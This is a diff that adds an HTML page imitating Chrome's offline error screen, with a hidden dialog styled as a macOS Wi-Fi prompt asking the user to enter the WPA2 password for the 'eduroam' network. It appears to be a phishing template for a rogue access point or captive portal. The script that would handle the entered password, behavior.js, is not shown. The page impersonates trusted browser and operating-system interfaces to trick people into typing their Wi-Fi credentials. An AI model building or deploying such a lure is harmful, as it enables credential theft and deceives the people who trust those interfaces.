@@ -1,0 +1,73 @@
+<html i18n-values="dir:textdirection;lang:language" dir="ltr" lang="en" i18n-processed="">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0,
+        maximum-scale=1.0, user-scalable=no">
+        <title i18n-content="title">Internet connection is not available</title>
+        <link rel='stylesheet' href='chrome-offline.css' type='text/css' />
+        <link rel='stylesheet' href='mac-network-manager.css' />
+    </head>
+    <body id="t" class="offline" style="font-family: 'Helvetica Neue', 'Lucida Grande', sans-serif; font-size: 75%;">
+    <div id="main-frame-error" class="interstitial-wrapper">
+        <div id="main-content">
+            <img class="dinosaur" src="dinosaur.png" width="45" />
+            <div class="icon icon-offline" style="visibility: hidden;"></div>
+            <div id="main-message">
+                <h1>There is no Internet connection</h1>
+                <p>You can try to diagnose the problem by taking the following steps:
+                <br />
+                Go to
+                <strong>
+                Applications &gt; System Preferences &gt; Network &gt; Assist me
+                </strong>
+                to test your connection.</p>
+                <div id="suggestions-list" >
+                    <p >Try:</p>
+                    <ul class="">
+                        <li>Checking the network cable or router</li>
+                        <li>Resetting the modem or router</li>
+                        <li>Reconnecting to Wi-Fi</li>
+                    </ul>
+                </div>
+                <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
+            </div>
+        </div>
+        <div id="buttons" class="nav-wrapper suggested-right" >
+            <button id="details-button" class="text-button small-link singular">Details</button>
+        </div>
+        <div id="details" class="hidden" ></div>
+        <div class="mac-wifi" id="mac-wifi" style="display:none">
+            <div id="modal-title" class="title"></div>
+            <div class="content">
+                <div class="icon">
+                    <img src="wifi-icon.png" alt="WiFi signal" width="70" class="wifi-icon" />
+                    <img src="question.png" alt="?" width="25" class="question" />
+                </div>
+                <div class="description">
+                    <form id="wifi-search-form">
+                        <strong>The Wi-Fi network ″eduroam″ requires a WPA2 password.</strong>
+      
+                        <div class="password">
+                            <label>Password:</label>
+                            <input type="password" id="wifi-search-password" />
+                            <div class="glow"></div>
+                        </div>
+      
+                        <div class='checkmark'>
+                            <input id="show-password" type="checkbox" /><label for="show-password">Show password</label>
+                        </div>
+                        <div class='checkmark'>
+                            <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>
+                        </div>
+      
+                        <div class='buttons'>
+                            <button id="button-join" class="action" disabled="disabled">Join</button>
+                            <button id="button-cancel">Cancel</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        <script src='behavior.js'></script>
+    </body>
+</html>
